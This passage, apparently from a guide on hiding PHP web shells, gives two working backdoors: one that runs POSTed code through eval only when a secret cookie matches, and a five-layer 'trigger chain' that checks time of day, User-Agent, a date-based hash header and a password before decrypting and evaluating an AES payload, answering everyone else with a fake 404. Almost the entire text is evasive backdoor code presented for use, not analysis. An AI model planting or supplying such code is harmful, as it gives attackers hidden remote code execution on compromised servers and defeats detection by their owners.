### 2.7 Cookie-based Trigger

**PHP Example:**

```php
<?php
if (!isset($_COOKIE['X-SESSION']) || $_COOKIE['X-SESSION'] !== 'auth_token_value') {
    header('HTTP/1.1 404 Not Found');
    exit;
}
@eval($_POST['code']);
?>
```

### 2.8 Multi-layer Dynamic Trigger Chain

Combine multiple dynamic checks into a defense-in-depth approach.

**PHP Example — Full trigger chain:**

```php
<?php
// Layer 1: Time window
$hour = (int)date('H');
if ($hour < 1 || $hour > 5) { http_response_code(404); exit; }

// Layer 2: User-Agent
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (strpos($ua, 'CustomClient/2.0') === false) { http_response_code(404); exit; }

// Layer 3: Custom header
if (($_SERVER['HTTP_X_VERIFY'] ?? '') !== hash('sha256', date('Ymd') . 'salt')) {
    http_response_code(404); exit;
}

// Layer 4: Password
if (($_POST['auth'] ?? '') !== 'supersecret2026') { http_response_code(404); exit; }

// Layer 5: Encrypted payload
$key = substr(hash('sha256', date('YmdH')), 0, 16);
$code = openssl_decrypt(base64_decode($_POST['data']), 'aes-256-cbc', $key, 0, substr($key, 0, 16));
if ($code) { eval($code); }
?>
```

---



---
📖 本切片 2/2 结束。 本章节结束。